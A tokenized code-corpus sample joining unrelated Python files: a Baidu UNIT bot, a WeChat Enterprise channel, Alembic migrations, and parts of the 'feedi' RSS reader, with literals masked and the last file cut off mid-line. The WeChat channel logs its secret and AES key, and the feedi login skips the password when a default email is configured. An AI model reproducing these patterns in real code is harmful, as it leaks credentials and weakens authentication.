<s> import requests <EOL> from bot . bot import Bot <EOL> class BaiduUnitBot ( Bot ) : <EOL> def reply ( self , query , context = None ) : <EOL> token = self . get_token ( ) <EOL> url = '<STR_LIT>' + token <EOL> post_data = "<STR_LIT>" + query + "<STR_LIT>" <EOL> print ( post_data ) <EOL> headers = { '<STR_LIT>' : '<STR_LIT>' } <EOL> response = requests . post ( url , data = post_data . encode ( ) , headers = headers ) <EOL> if response : <EOL> return response . json ( ) [ '<STR_LIT>' ] [ '<STR_LIT>' ] [ '<STR_LIT>' ] [ <NUM_LIT> ] <EOL> def get_token ( self ) : <EOL> access_key = '<STR_LIT>' <EOL> secret_key = '<STR_LIT>' <EOL> host = '<STR_LIT>' + access_key + '<STR_LIT>' + secret_key <EOL> response = requests . get ( host ) <EOL> if response : <EOL> print ( response . json ( ) ) <EOL> return response . json ( ) [ '<STR_LIT>' ] <EOL> </s>
<s> TRANSLATE = '<STR_LIT>' <EOL> class ReturnValue ( dict ) : <EOL> def __init__ ( self , returnValueDict = { } , rawResponse = None ) : <EOL> if rawResponse : <EOL> try : <EOL> returnValueDict = rawResponse . json ( ) <EOL> except ValueError : <EOL> returnValueDict = { <EOL> '<STR_LIT>' : { <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : '<STR_LIT>' , } , <EOL> '<STR_LIT>' : rawResponse . content , } <EOL> for k , v in returnValueDict . items ( ) : <EOL> self [ k ] = v <EOL> if not '<STR_LIT>' in self : <EOL> self [ '<STR_LIT>' ] = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : - <NUM_LIT> , } <EOL> if TRANSLATE : <EOL> self [ '<STR_LIT>' ] [ '<STR_LIT>' ] = self [ '<STR_LIT>' ] . get ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> self [ '<STR_LIT>' ] [ '<STR_LIT>' ] = TRANSLATION [ TRANSLATE ] . get ( <EOL> self [ '<STR_LIT>' ] . get ( '<STR_LIT>' , '<STR_LIT>' ) ) or self [ '<STR_LIT>' ] . get ( '<STR_LIT>' , u'<STR_LIT>' ) <EOL> self [ '<STR_LIT>' ] [ '<STR_LIT>' ] = self [ '<STR_LIT>' ] [ '<STR_LIT>' ] or self [ '<STR_LIT>' ] [ '<STR_LIT>' ] <EOL> def __nonzero__ ( self ) : <EOL> return self [ '<STR_LIT>' ] . get ( '<STR_LIT>' ) == <NUM_LIT> <EOL> def __bool__ ( self ) : <EOL> return self . __nonzero__ ( ) <EOL> def __str__ ( self ) : <EOL> return '<STR_LIT>' % '<STR_LIT>' . join ( <EOL> [ '<STR_LIT>' % ( repr ( k ) , repr ( v ) ) for k , v in self . items ( ) ] ) <EOL> def __repr__ ( self ) : <EOL> return '<STR_LIT>' % self . __str__ ( ) <EOL> TRANSLATION = { <EOL> '<STR_LIT>' : { <EOL> - <NUM_LIT> : u'<STR_LIT>' , <EOL> - <NUM_LIT> : u'<STR_LIT>' , <EOL> - <NUM_LIT> : u'<STR_LIT>' , <EOL> - <NUM_LIT> : u'<STR_LIT>' , <EOL> - <NUM_LIT> : u'<STR_LIT>' , <EOL> - <NUM_LIT> : u'<STR_LIT>' , <EOL> - <NUM_LIT> : u'<STR_LIT>' , <EOL> <NUM_LIT> : u'<STR_LIT>' , <EOL> } , <EOL> } <EOL> </s>
<s> from channel . channel import Channel <EOL> from concurrent . futures import ThreadPoolExecutor <EOL> from common . log import logger <EOL> from config import conf <EOL> import json <EOL> import requests <EOL> import io <EOL> from wechatpy . enterprise . crypto import WeChatCrypto <EOL> from wechatpy . enterprise import WeChatClient <EOL> from wechatpy . exceptions import InvalidSignatureException <EOL> from wechatpy . enterprise . exceptions import InvalidCorpIdException <EOL> from wechatpy . enterprise import parse_message <EOL> from flask import Flask , request , abort <EOL> thread_pool = ThreadPoolExecutor ( max_workers = <NUM_LIT> ) <EOL> app = Flask ( __name__ ) <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' , '<STR_LIT>' ] ) <EOL> def handler_msg ( ) : <EOL> return WechatEnterpriseChannel ( ) . handle ( ) <EOL> class WechatEnterpriseChannel ( Channel ) : <EOL> def __init__ ( self ) : <EOL> self . CorpId = conf ( ) . get ( '<STR_LIT>' ) <EOL> self . Secret = conf ( ) . get ( '<STR_LIT>' ) <EOL> self . AppId = conf ( ) . get ( '<STR_LIT>' ) <EOL> self . TOKEN = conf ( ) . get ( '<STR_LIT>' ) <EOL> self . EncodingAESKey = conf ( ) . get ( '<STR_LIT>' ) <EOL> self . crypto = WeChatCrypto ( self . TOKEN , self . EncodingAESKey , self . CorpId ) <EOL> self . client = WeChatClient ( self . CorpId , self . Secret , self . AppId ) <EOL> logger . info ( "<STR_LIT>" . format ( <EOL> self . CorpId , self . Secret , self . AppId , self . TOKEN , self . EncodingAESKey ) ) <EOL> def startup ( self ) : <EOL> app . run ( host = '<STR_LIT>' , port = <NUM_LIT> ) <EOL> def send ( self , msg , receiver ) : <EOL> logger . info ( '<STR_LIT>' . format ( msg , receiver ) ) <EOL> self . client . message . send_text ( self . AppId , receiver , msg ) <EOL> def _do_send ( self , query , reply_user_id ) : <EOL> try : <EOL> if not query : <EOL> return <EOL> context = dict ( ) <EOL> context [ '<STR_LIT>' ] = reply_user_id <EOL> reply_text = super ( ) . build_reply_content ( query , context ) <EOL> if reply_text : <EOL> self . send ( reply_text , reply_user_id ) <EOL> except Exception as e : <EOL> logger . exception ( e ) <EOL> def handle ( self ) : <EOL> query_params = request . args <EOL> signature = query_params . get ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> timestamp = query_params . get ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> nonce = query_params . get ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> if request . method == '<STR_LIT>' : <EOL> echostr = query_params . get ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> try : <EOL> echostr = self . crypto . check_signature ( signature , timestamp , nonce , echostr ) <EOL> except InvalidSignatureException : <EOL> abort ( <NUM_LIT> ) <EOL> print ( echostr ) <EOL> return echostr <EOL> elif request . method == '<STR_LIT>' : <EOL> try : <EOL> message = self . crypto . decrypt_message ( <EOL> request . data , <EOL> signature , <EOL> timestamp , <EOL> nonce <EOL> ) <EOL> except ( InvalidSignatureException , InvalidCorpIdException ) : <EOL> abort ( <NUM_LIT> ) <EOL> msg = parse_message ( message ) <EOL> if msg . type == '<STR_LIT>' : <EOL> reply = '<STR_LIT>' <EOL> thread_pool . submit ( self . _do_send , msg . content , msg . source ) <EOL> else : <EOL> reply = '<STR_LIT>' <EOL> self . client . message . send_text ( self . AppId , msg . source , reply ) <EOL> return '<STR_LIT>' <EOL> </s>
<s> from curl_cffi import Curl , CurlOpt <EOL> from io import BytesIO <EOL> buffer = BytesIO ( ) <EOL> c = Curl ( ) <EOL> c . setopt ( CurlOpt . URL , b'<STR_LIT>' ) <EOL> c . setopt ( CurlOpt . WRITEDATA , buffer ) <EOL> c . impersonate ( "<STR_LIT>" ) <EOL> c . perform ( ) <EOL> c . close ( ) <EOL> body = buffer . getvalue ( ) <EOL> print ( body . decode ( ) ) <EOL> </s>
<s> from typing import Sequence , Union <EOL> import sqlalchemy as sa <EOL> from alembic import op <EOL> revision : str = '<STR_LIT>' <EOL> down_revision : Union [ str , None ] = '<STR_LIT>' <EOL> branch_labels : Union [ str , Sequence [ str ] , None ] = None <EOL> depends_on : Union [ str , Sequence [ str ] , None ] = None <EOL> def upgrade ( ) -> None : <EOL> with op . batch_alter_table ( '<STR_LIT>' , schema = None ) as batch_op : <EOL> batch_op . alter_column ( '<STR_LIT>' , <EOL> server_default = None , <EOL> nullable = True ) <EOL> def downgrade ( ) -> None : <EOL> pass <EOL> </s>
<s> ENV = '<STR_LIT>' <EOL> SECRET_KEY = b'<STR_LIT>' <EOL> TEMPLATES_AUTO_RELOAD = True <EOL> </s>
<s> from typing import Sequence , Union <EOL> from alembic import op <EOL> import sqlalchemy as sa <EOL> revision : str = '<STR_LIT>' <EOL> down_revision : Union [ str , None ] = '<STR_LIT>' <EOL> branch_labels : Union [ str , Sequence [ str ] , None ] = None <EOL> depends_on : Union [ str , Sequence [ str ] , None ] = None <EOL> def upgrade ( ) -> None : <EOL> with op . batch_alter_table ( '<STR_LIT>' , schema = None ) as batch_op : <EOL> batch_op . add_column ( sa . Column ( '<STR_LIT>' , sa . String ( ) , nullable = True ) ) <EOL> batch_op . add_column ( sa . Column ( '<STR_LIT>' , sa . String ( ) , nullable = True ) ) <EOL> def downgrade ( ) -> None : <EOL> with op . batch_alter_table ( '<STR_LIT>' , schema = None ) as batch_op : <EOL> batch_op . drop_column ( '<STR_LIT>' ) <EOL> batch_op . drop_column ( '<STR_LIT>' ) <EOL> </s>
<s> from typing import Sequence , Union <EOL> import sqlalchemy as sa <EOL> from alembic import op <EOL> revision : str = '<STR_LIT>' <EOL> down_revision : Union [ str , None ] = '<STR_LIT>' <EOL> branch_labels : Union [ str , Sequence [ str ] , None ] = None <EOL> depends_on : Union [ str , Sequence [ str ] , None ] = None <EOL> def upgrade ( ) -> None : <EOL> op . create_table ( '<STR_LIT>' , <EOL> sa . Column ( '<STR_LIT>' , sa . INTEGER ( ) , nullable = False ) , <EOL> sa . Column ( '<STR_LIT>' , sa . INTEGER ( ) , nullable = False ) , <EOL> sa . Column ( '<STR_LIT>' , sa . VARCHAR ( ) , nullable = False ) , <EOL> sa . ForeignKeyConstraint ( [ '<STR_LIT>' ] , [ '<STR_LIT>' ] , ) , <EOL> sa . PrimaryKeyConstraint ( '<STR_LIT>' ) , <EOL> sa . UniqueConstraint ( '<STR_LIT>' ) <EOL> ) <EOL> def downgrade ( ) -> None : <EOL> op . drop_table ( '<STR_LIT>' ) <EOL> </s>
<s> import json <EOL> import logging <EOL> import shutil <EOL> import subprocess <EOL> import urllib <EOL> import zipfile <EOL> import favicon . favicon as favicon <EOL> from bs4 import BeautifulSoup <EOL> from feedi . requests import USER_AGENT , requests <EOL> logger = logging . getLogger ( __name__ ) <EOL> def get_favicon ( url , html = None ) : <EOL> "<STR_LIT>" <EOL> url_parts = urllib . parse . urlparse ( url ) <EOL> url = f'<STR_LIT>' <EOL> try : <EOL> if not html : <EOL> favicons = favicon . get ( url , headers = { '<STR_LIT>' : USER_AGENT } , timeout = <NUM_LIT> ) <EOL> else : <EOL> favicons = sorted ( favicon . tags ( url , html ) , <EOL> key = lambda i : i . width + i . height , reverse = True ) <EOL> except Exception : <EOL> logger . exception ( "<STR_LIT>" , url ) <EOL> return <EOL> ico_format = [ f for f in favicons if f . format == '<STR_LIT>' ] <EOL> if ico_format : <EOL> return ico_format [ <NUM_LIT> ] . url <EOL> return favicons [ <NUM_LIT> ] . url if favicons else None <EOL> class CachingRequestsMixin : <EOL> def __init__ ( self ) : <EOL> self . response_cache = { } <EOL> def request ( self , url ) : <EOL> if url in self . response_cache : <EOL> logger . debug ( "<STR_LIT>" , url ) <EOL> return self . response_cache [ url ] <EOL> logger . debug ( "<STR_LIT>" , url ) <EOL> content = requests . get ( url ) . content <EOL> self . response_cache [ url ] = content <EOL> return content <EOL> def fetch_meta ( self , url , * tags ) : <EOL> soup = BeautifulSoup ( self . request ( url ) , '<STR_LIT>' ) <EOL> return extract_meta ( soup , * tags ) <EOL> def extract_meta ( soup , * tags ) : <EOL> for tag in tags : <EOL> for attr in [ '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ] : <EOL> meta_tag = soup . find ( "<STR_LIT>" , { attr : tag } , content = True ) <EOL> if meta_tag : <EOL> return meta_tag [ '<STR_LIT>' ] <EOL> def all_meta ( soup ) : <EOL> result = { } <EOL> for attr in [ '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ] : <EOL> for meta_tag in soup . find_all ( "<STR_LIT>" , { attr : True } , content = True ) : <EOL> result [ meta_tag [ attr ] ] = meta_tag [ '<STR_LIT>' ] <EOL> return result <EOL> def extract_links ( url , html ) : <EOL> soup = BeautifulSoup ( html , '<STR_LIT>' ) <EOL> links = soup . find_all ( lambda tag : tag . name == '<STR_LIT>' and tag . text and '<STR_LIT>' in tag ) <EOL> return [ ( make_absolute ( url , a [ '<STR_LIT>' ] ) , a . text ) for a in links ] <EOL> def make_absolute ( url , path ) : <EOL> "<STR_LIT>" <EOL> if not urllib . parse . urlparse ( path ) . netloc : <EOL> path = urllib . parse . urljoin ( url , path ) <EOL> return path <EOL> def extract ( url = None , html = None ) : <EOL> if url : <EOL> html = requests . get ( url ) . content <EOL> elif not html : <EOL> raise ValueError ( '<STR_LIT>' ) <EOL> r = subprocess . run ( [ "<STR_LIT>" , "<STR_LIT>" , url ] , input = html , <EOL> capture_output = True , check = True ) <EOL> article = json . loads ( r . stdout ) <EOL> soup = BeautifulSoup ( article [ '<STR_LIT>' ] , '<STR_LIT>' ) <EOL> LAZY_DATA_ATTRS = [ '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ] <EOL> for data_attr in LAZY_DATA_ATTRS : <EOL> for img in soup . findAll ( '<STR_LIT>' , attrs = { data_attr : True } ) : <EOL> img . attrs = { '<STR_LIT>' : img [ data_attr ] } <EOL> for iframe in soup . findAll ( '<STR_LIT>' , height = True ) : <EOL> del iframe [ '<STR_LIT>' ] <EOL> article [ '<STR_LIT>' ] = str ( soup ) <EOL> return article <EOL> def compress ( outfilename , article ) : <EOL> soup = BeautifulSoup ( article [ '<STR_LIT>' ] , '<STR_LIT>' ) <EOL> with zipfile . ZipFile ( outfilename , '<STR_LIT>' , compression = zipfile . ZIP_DEFLATED ) as zip : <EOL> for img in soup . findAll ( '<STR_LIT>' ) : <EOL> img_url = img [ '<STR_LIT>' ] <EOL> img_filename = '<STR_LIT>' + img [ '<STR_LIT>' ] . split ( '<STR_LIT>' ) [ - <NUM_LIT> ] . split ( '<STR_LIT>' ) [ <NUM_LIT> ] <EOL> img [ '<STR_LIT>' ] = img_filename <EOL> with requests . get ( img_url , stream = True ) as img_src , zip . open ( img_filename , mode = '<STR_LIT>' ) as img_dest : <EOL> shutil . copyfileobj ( img_src . raw , img_dest ) <EOL> zip . writestr ( '<STR_LIT>' , str ( soup ) ) <EOL> </s>
<s> import urllib <EOL> import flask <EOL> import flask_login <EOL> from flask import current_app as app <EOL> from flask_login import current_user , login_required <EOL> import feedi . models as models <EOL> from feedi . models import db <EOL> def init ( ) : <EOL> login_manager = flask_login . LoginManager ( ) <EOL> login_manager . login_view = '<STR_LIT>' <EOL> login_manager . init_app ( app ) <EOL> @ login_manager . user_loader <EOL> def load_user ( user_id ) : <EOL> return db . session . get ( models . User , int ( user_id ) ) <EOL> @ app . get ( "<STR_LIT>" ) <EOL> def login ( ) : <EOL> default_email = app . config . get ( '<STR_LIT>' ) <EOL> if default_email : <EOL> app . logger . debug ( "<STR_LIT>" , default_email ) <EOL> user = db . session . scalar ( db . select ( models . User ) . filter_by ( email = default_email ) ) <EOL> flask_login . login_user ( user , remember = True ) <EOL> return flask . redirect ( flask . url_for ( '<STR_LIT>' ) ) <EOL> return flask . render_template ( '<STR_LIT>' ) <EOL> @ app . post ( '<STR_LIT>' ) <EOL> def login_post ( ) : <EOL> email = flask . request . form . get ( '<STR_LIT>' ) <EOL> password = flask . request . form . get ( '<STR_LIT>' ) <EOL> if not email or not password : <EOL> return flask . render_template ( '<STR_LIT>' , error_msg = "<STR_LIT>" ) <EOL> user = db . session . scalar ( db . select ( models . User ) . filter_by ( email = email ) ) <EOL> if not user or not user . check_password ( password ) : <EOL> return flask . render_template ( '<STR_LIT>' , error_msg = "<STR_LIT>" ) <EOL> flask_login . login_user ( user , remember = True ) <EOL> return flask . redirect ( flask . url_for ( '<STR_LIT>' ) ) <EOL> @ app . get ( "<STR_LIT>" ) <EOL> @ login_required <EOL> def kindle_add ( ) : <EOL> verifier , url = models . KindleDevice . signin_url ( ) <EOL> return flask . render_template ( '<STR_LIT>' , signin_url = url , verifier = verifier ) <EOL> @ app . post ( "<STR_LIT>" ) <EOL> @ login_required <EOL> def kindle_add_submit ( ) : <EOL> verifier = flask . request . form . get ( '<STR_LIT>' ) <EOL> redirect_url = flask . request . form . get ( '<STR_LIT>' ) <EOL> models . KindleDevice . add_from_url ( current_user . id , verifier , redirect_url ) <EOL> db . session . commit ( ) <EOL> return flask . redirect ( flask . url_for ( '<STR_LIT>' ) ) <EOL> @ app . get ( "<STR_LIT>" ) <EOL> @ login_required <EOL> def mastodon_oauth ( ) : <EOL> "<STR_LIT>" <EOL> return flask . render_template ( '<STR_LIT>' ) <EOL> @ app . post ( "<STR_LIT>" ) <EOL> @ login_required <EOL> def mastodon_oauth_submit ( ) : <EOL> base_url = flask . request . form . get ( '<STR_LIT>' ) <EOL> if not base_url : <EOL> return flask . render_template ( '<STR_LIT>' , error_msg = "<STR_LIT>" ) <EOL> url_parts = urllib . parse . urlparse ( base_url ) <EOL> base_url = f'<STR_LIT>' <EOL> app . logger . info ( '<STR_LIT>' , base_url ) <EOL> masto_app = models . MastodonApp . get_or_create ( base_url ) <EOL> return flask . redirect ( masto_app . auth_redirect_url ( ) ) <EOL> @ app . get ( "<STR_LIT>" ) <EOL> @ login_required <EOL> def mastodon_oauth_callback ( ) : <EOL> code = flask . request . args . get ( '<STR_LIT>' ) <EOL> base_url = flask . request . args . get ( '<STR_LIT>' ) <EOL> if not code or not base_url : <EOL> app . logger . error ( "<STR_LIT>" ) <EOL> flask . abort ( <NUM_LIT> ) <EOL> masto_app = db . session . scalar ( db . select ( models . MastodonApp ) . filter_by ( api_base_url = base_url ) ) <EOL> if not masto_app : <EOL> app . logger . error ( "<STR_LIT>" , base_url ) <EOL> flask . abort ( <NUM_LIT> ) <EOL> app . logger . info ( "<STR_LIT>" , current_user . id , base_url ) <EOL> account = masto_app . create_account ( current_user . id , code ) <EOL> app . logger . info ( "<STR_LIT>" ) <EOL> return flask . redirect ( flask . url_for ( '<STR_LIT>' , masto_acct = account . id ) ) <EOL> </s>
<s> from typing import Sequence , Union <EOL> from alembic import op <EOL> import sqlalchemy as sa <EOL> revision : str = '<STR_LIT>' <EOL> down_revision : Union [ str , None ] = '<STR_LIT>' <EOL> branch_labels : Union [ str , Sequence [ str ] , None ] = None <EOL> depends_on : Union [ str , Sequence [ str ] , None ] = None <EOL> def upgrade ( ) -> None : <EOL> with op . batch_alter_table ( '<STR_LIT>' , schema = None ) as batch_op : <EOL> batch_op . drop_column ( '<STR_LIT>' ) <EOL> def downgrade ( ) -> None : <EOL> with op . batch_alter_table ( '<STR_LIT>' , schema = None ) as batch_op : <EOL> batch_op . add_column ( sa . Column ( '<STR_LIT>' , sa . INTEGER ( ) , server_default = sa . text ( "<STR_LIT>" ) , nullable = False ) ) <EOL> </s>
<s> import os <EOL> import re <EOL> import uuid <EOL> import feedgen . feed as feedgen <EOL> import feedi . app as feedi_app <EOL> import httpretty <EOL> import pytest <EOL> from feedi . models import db <EOL> @ pytest . fixture ( scope = '<STR_LIT>' ) <EOL> def app ( ) : <EOL> assert os . getenv ( '<STR_LIT>' ) == '<STR_LIT>' , "<STR_LIT>" <EOL> app = feedi_app . create_app ( ) <EOL> httpretty . enable ( allow_net_connect = False , verbose = True ) <EOL> yield app <EOL> httpretty . disable ( ) <EOL> with app . app_context ( ) : <EOL> db . drop_all ( ) <EOL> @ pytest . fixture <EOL> def client ( app ) : <EOL> "<STR_LIT>" <EOL> email = f'<STR_LIT>' <EOL> with app . app_context ( ) : <EOL> from feedi import models <EOL> user = models . User ( email = email ) <EOL> user . set_password ( '<STR_LIT>' ) <EOL> db . session . add ( user ) <EOL> db . session . commit ( ) <EOL> client = app . test_client ( ) <EOL> response = client . post ( <EOL> '<STR_LIT>' , data = { '<STR_LIT>' : email , '<STR_LIT>' : '<STR_LIT>' } , follow_redirects = True ) <EOL> assert response . status_code == <NUM_LIT> <EOL> httpretty . reset ( ) <EOL> return client <EOL> def create_feed ( client , domain , items , folder = None ) : <EOL> feed_url = mock_feed ( domain , items ) <EOL> return client . post ( '<STR_LIT>' , data = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : domain , <EOL> '<STR_LIT>' : feed_url , <EOL> '<STR_LIT>' : folder <EOL> } , follow_redirects = True ) <EOL> def mock_feed ( domain , items ) : <EOL> base_url = f'<STR_LIT>' <EOL> feed_url = f'<STR_LIT>' <EOL> fg = feedgen . FeedGenerator ( ) <EOL> fg . id ( base_url ) <EOL> fg . link ( href = feed_url ) <EOL> fg . title ( f'<STR_LIT>' ) <EOL> fg . description ( f'<STR_LIT>' ) <EOL> for item in items : <EOL> entry_url = f'<STR_LIT>' <EOL> entry = fg . add_entry ( ) <EOL> entry . id ( ) <EOL> entry . link ( href = entry_url ) <EOL> entry . title ( item [ '<STR_LIT>' ] ) <EOL> entry . author ( { "<STR_LIT>" : item . get ( '<STR_LIT>' , '<STR_LIT>' ) } ) <EOL> entry . published ( item [ '<STR_LIT>' ] ) <EOL> entry . updated ( item [ '<STR_LIT>' ] ) <EOL> entry . description ( item . get ( '<STR_LIT>' , '<STR_LIT>' ) ) <EOL> mock_request ( entry_url , body = item . get ( '<STR_LIT>' , '<STR_LIT>' ) ) <EOL> rssfeed = fg . rss_str ( ) <EOL> mock_request ( base_url ) <EOL> mock_request ( f'<STR_LIT>' , ctype = '<STR_LIT>' ) <EOL> mock_request ( feed_url , body = rssfeed , ctype = '<STR_LIT>' ) <EOL> return feed_url <EOL> def mock_request ( url , body = '<STR_LIT>' , ctype = '<STR_LIT>' ) : <EOL> httpretty . register_uri ( httpretty . HEAD , url , adding_headers = { <EOL> '<STR_LIT>' : ctype } , priority = <NUM_LIT> ) <EOL> httpretty . register_uri ( httpretty . GET , url , body = body , adding_headers = { <EOL> '<STR_LIT>' : ctype } , priority = <NUM_LIT> ) <EOL> def extract_entry_ids ( response ) : <EOL> entry_ids_with_duplicates = re . findall ( r'<STR_LIT>' , response . text ) <EOL> entry_ids = [ ] <EOL> for e in entry_ids_with_duplicates : <EOL> if e not in entry_ids : <EOL> entry_ids . append ( e ) <EOL> return entry_ids <EOL> </s>
<s> from typing import Sequence , Union <EOL> from alembic import op <EOL> import sqlalchemy as sa <EOL> revision : str = '<STR_LIT>' <EOL> down_revision : Union [ str , None ] = '<STR_LIT>' <EOL> branch_labels : Union [ str , Sequence [ str ] , None ] = None <EOL> depends_on : Union [ str , Sequence [ str ] , None ] = None <EOL> def upgrade ( ) -> None : <EOL> op . add_column ( '<STR_LIT>' , sa . Column ( '<STR_LIT>' , sa . Boolean ( ) , nullable = True ) ) <EOL> def downgrade ( ) -> None : <EOL> op . drop_column ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> </s>
<s> from typing import Sequence , Union <EOL> from alembic import op <EOL> import sqlalchemy as sa <EOL> revision : str = '<STR_LIT>' <EOL> down_revision : Union [ str , None ] = '<STR_LIT>' <EOL> branch_labels : Union [ str , Sequence [ str ] , None ] = None <EOL> depends_on : Union [ str , Sequence [ str ] , None ] = None <EOL> def upgrade ( ) -> None : <EOL> with op . batch_alter_table ( '<STR_LIT>' , schema = None ) as batch_op : <EOL> batch_op . drop_column ( '<STR_LIT>' ) <EOL> def downgrade ( ) -> None : <EOL> with op . batch_alter_table ( '<STR_LIT>' , schema = None ) as batch_op : <EOL> batch_op . add_column ( sa . Column ( '<STR_LIT>' , sa . VARCHAR ( ) , nullable = True ) ) <EOL> </s>
<s> from typing import Sequence , Union <EOL> import sqlalchemy as sa <EOL> from alembic import op <EOL> from werkzeug . security import generate_password_hash <EOL> revision : str = '<STR_LIT>' <EOL> down_revision : Union [ str , None ] = '<STR_LIT>' <EOL> branch_labels : Union [ str , Sequence [ str ] , None ] = None <EOL> depends_on : Union [ str , Sequence [ str ] , None ] = None <EOL> def upgrade ( ) -> None : <EOL> table = op . create_table ( '<STR_LIT>' , <EOL> sa . Column ( '<STR_LIT>' , sa . Integer ( ) , nullable = False ) , <EOL> sa . Column ( '<STR_LIT>' , sa . String ( length = <NUM_LIT> ) , nullable = False ) , <EOL> sa . Column ( '<STR_LIT>' , sa . String ( length = <NUM_LIT> ) , nullable = False ) , <EOL> sa . PrimaryKeyConstraint ( '<STR_LIT>' ) , <EOL> sa . UniqueConstraint ( '<STR_LIT>' ) <EOL> ) <EOL> op . bulk_insert ( <EOL> table , <EOL> [ { "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : generate_password_hash ( "<STR_LIT>" ) } ] ) <EOL> def downgrade ( ) -> None : <EOL> op . drop_table ( '<STR_LIT>' ) <EOL> </s>
<s> from typing import Sequence , Union <EOL> import sqlalchemy as sa <EOL> from alembic import op <EOL> revision : str = '<STR_LIT>' <EOL> down_revision : Union [ str , None ] = '<STR_LIT>' <EOL> branch_labels : Union [ str , Sequence [ str ] , None ] = None <EOL> depends_on : Union [ str , Sequence [ str ] , None ] = None <EOL> def upgrade ( ) -> None : <EOL> with op . batch_alter_table ( '<STR_LIT>' , schema = None ) as batch_op : <EOL> batch_op . drop_column ( '<STR_LIT>' ) <EOL> def downgrade ( ) -> None : <EOL> with op . batch_alter_table ( '<STR_LIT>' , schema = None ) as batch_op : <EOL> batch_op . add_column ( sa . Column ( '<STR_LIT>' , sa . BOOLEAN ( ) , nullable = True ) ) <EOL> </s>
<s> from logging . config import fileConfig <EOL> from alembic import context <EOL> from feedi . models import db <EOL> from sqlalchemy import engine_from_config , pool <EOL> config = context . config <EOL> if config . config_file_name is not None : <EOL> fileConfig ( config . config_file_name ) <EOL> target_metadata = db . Model . metadata <EOL> def run_migrations_offline ( ) -> None : <EOL> url = config . get_main_option ( "<STR_LIT>" ) <EOL> context . configure ( <EOL> url = url , <EOL> target_metadata = target_metadata , <EOL> literal_binds = True , <EOL> render_as_batch = True , <EOL> dialect_opts = { "<STR_LIT>" : "<STR_LIT>" } , <EOL> ) <EOL> with context . begin_transaction ( ) : <EOL> context . run_migrations ( ) <EOL> def run_migrations_online ( ) -> None : <EOL> connectable = engine_from_config ( <EOL> config . get_section ( config . config_ini_section , { } ) , <EOL> prefix = "<STR_LIT>" , <EOL> poolclass = pool . NullPool , <EOL> ) <EOL> with connectable . connect ( ) as connection : <EOL> context . configure ( <EOL> connection = connection , <EOL> target_metadata = target_metadata , <EOL> render_as_batch = True <EOL> ) <EOL> with context . begin_transaction ( ) : <EOL> context . run_migrations ( ) <EOL> if context . is_offline_mode ( ) : <EOL> run_migrations_offline ( ) <EOL> else : <EOL> run_migrations_online ( ) <EOL> </s>
<s> from typing import Sequence , Union <EOL> import sqlalchemy as sa <EOL> from alembic import op <EOL> revision : str = '<STR_LIT>' <EOL> down_revision : Union [ str , None ] = '<STR_LIT>' <EOL> branch_labels : Union [ str , Sequence [ str ] , None ] = None <EOL> depends_on : Union [ str , Sequence [ str ] , None ] = None <EOL> def upgrade ( ) -> None : <EOL> with op . batch_alter_table ( '<STR_LIT>' , schema = None ) as batch_op : <EOL> batch_op . drop_index ( '<STR_LIT>' ) <EOL> batch_op . alter_column ( '<STR_LIT>' , new_column_name = '<STR_LIT>' ) <EOL> batch_op . alter_column ( '<STR_LIT>' , new_column_name = '<STR_LIT>' ) <EOL> def downgrade ( ) -> None : <EOL> with op . batch_alter_table ( '<STR_LIT>' , schema = None ) as batch_op : <EOL> batch_op . alter_column ( '<STR_LIT>' , new_column_name = '<STR_LIT>' ) <EOL> batch_op . alter_column ( '<STR_LIT>' , new_column_name = '<STR_LIT>' ) <EOL> </s>
<s> import datetime <EOL> import html <EOL> import json <EOL> import logging <EOL> import pprint <EOL> import time <EOL> import traceback <EOL> import urllib <EOL> import feedparser <EOL> from bs4 import BeautifulSoup <EOL> from feedi import scraping <EOL> from feedi . requests import USER_AGENT , requests <EOL> from feedi . scraping import CachingRequestsMixin <EOL> logger = logging . getLogger ( __name__ ) <EOL> feedparser . USER_AGENT = USER_AGENT <EOL> def fetch ( feed_name , url , skip_older_than , min_amount , <EOL> previous_fetch , etag , modified , filters ) : <EOL> parser_cls = RSSParser <EOL> for cls in RSSParser . __subclasses__ ( ) : <EOL> if cls . is_compatible ( url ) : <EOL> parser_cls = cls <EOL> parser = parser_cls ( feed_name , url , skip_older_than , min_amount ) <EOL> return parser . fetch ( previous_fetch , etag , modified , filters ) <EOL> def fetch_icon ( url ) : <EOL> feed = feedparser . parse ( url ) <EOL> feed_link = feed [ '<STR_LIT>' ] . get ( '<STR_LIT>' , url ) <EOL> icon_url = scraping . get_favicon ( feed_link ) <EOL> if icon_url : <EOL> logger . debug ( "<STR_LIT>" , icon_url ) <EOL> return icon_url <EOL> icon_url = feed [ '<STR_LIT>' ] . get ( '<STR_LIT>' , feed [ '<STR_LIT>' ] . get ( '<STR_LIT>' ) ) <EOL> if icon_url and requests . get ( icon_url ) . ok : <EOL> logger . debug ( "<STR_LIT>" , icon_url ) <EOL> return icon_url <EOL> logger . debug ( "<STR_LIT>" , url ) <EOL> class RSSParser ( CachingRequestsMixin ) : <EOL> FIELDS = [ '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , ] <EOL> @ staticmethod <EOL> def is_compatible ( _feed_url ) : <EOL> raise NotImplementedError <EOL> def __init__ ( self , feed_name , url , skip_older_than , min_amount ) : <EOL> super ( ) . __init__ ( ) <EOL> self . feed_name = feed_name <EOL> self . url = url <EOL> self . skip_older_than = skip_older_than <EOL> self . min_amount = min_amount <EOL> def fetch ( self , previous_fetch , etag , modified , filters = None ) : <EOL> feed = feedparser . parse ( self . url , etag = etag , modified = 